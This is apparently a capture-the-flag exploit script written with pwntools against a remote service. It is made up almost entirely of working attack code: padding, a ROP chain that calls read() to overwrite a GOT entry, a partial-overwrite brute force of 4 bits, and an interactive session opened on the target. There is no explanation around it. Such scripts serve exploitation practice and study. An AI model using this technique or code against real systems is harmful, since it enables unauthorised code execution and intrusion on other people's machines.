#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.6"
#port = 8888
host = "128.199.152.175"
port = 10001
r = remote(host,port)
context.arch = "amd64"

# brute force 4 bit

payload = "a"*24
pop_rdi = 0x00000000004005c3
pop_rsi_r15 = 0x00000000004005c1
read = 0x400400
read_got = 0x0000000000601018
payload += flat([pop_rdi,0,pop_rsi_r15,read_got,0,read,read]) + "\x00"*0x78
r.sendline(payload)
r.send('\x67\x55')
r.interactive()
